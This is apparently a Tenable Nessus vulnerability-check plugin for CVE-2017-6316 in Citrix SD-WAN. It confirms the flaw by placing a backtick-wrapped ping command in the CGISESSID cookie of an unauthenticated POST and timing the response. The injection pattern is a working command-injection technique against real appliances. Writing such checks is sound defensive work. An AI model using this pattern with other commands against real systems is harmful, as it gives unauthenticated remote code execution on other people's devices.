#%NASL_MIN_LEVEL 70300
#
# (C) Tenable, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(121386);
  script_version("1.9");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/25");

  script_cve_id("CVE-2017-6316");
  script_bugtraq_id(99943);
  script_xref(name:"EDB-ID", value:"42345");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/04/15");

  script_name(english:"Citrix SD-WAN Cookie Command Injection");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a remote command injection
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Citrix SD-WAN appliance is affected by a remote command
injection vulnerability due to improper sanitization of user-supplied
input. An unauthenticated, remote attacker can exploit this, via a
specially crafted cookie in an HTTP request, to execute arbitrary
commands on the appliance.");
  script_set_attribute(attribute:"see_also", value:"https://support.citrix.com/article/CTX225990");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 9.2.1.1001 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-6316");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Citrix NetScaler SD-WAN RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/02/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/07/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/01/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:citrix:sd-wan");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2019-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("citrix_sdwan_detect.nbin");
  script_require_keys("installed_sw/Citrix SD-WAN");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("install_func.inc");
include("misc_func.inc");
include("http.inc");

app = 'Citrix SD-WAN';

# Exit if app is not detected on the target host
get_install_count(app_name:app, exit_if_zero:TRUE);
port = get_http_port(default:443);

# Exit if app is not detected on this port
install = get_single_install(
  app_name : app,
  port     : port
);

# Use the following command to confirm the vulnerability.
# Replace 192.168.123.123 with an IP that is pingable from
# the target host. Ping requests and replies should be
# seen in Wireshark.
#
#cmd = 'ping+-c+10+192.168.123.123';

# cmd is ran 4 times, takes about 37 seconds to finish
cmd = 'ping+-c+10+localhost';
cookie = 'CGISESSID=`' + cmd + '`;';

http_set_read_timeout(120);
t1 = unixtime();
res = http_send_recv3(
  method        : 'POST',
  item          : '/global_data/',
  data          : 'action=logout',
  content_type  : 'application/x-www-form-urlencoded',
  add_headers   : make_array('Cookie', cookie),
  port          : port,
  exit_on_fail  : TRUE);

t2 = unixtime();
if ("302" >< res[0] 
  # ping command was ran
  && t2 - t1 > 30)
{
  security_report_v4(
    port: port,
    severity: SECURITY_HOLE,
    generic: TRUE,
    request: make_list(http_last_sent_request())
  );
}
else
{
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:install['path'], port:port));
}
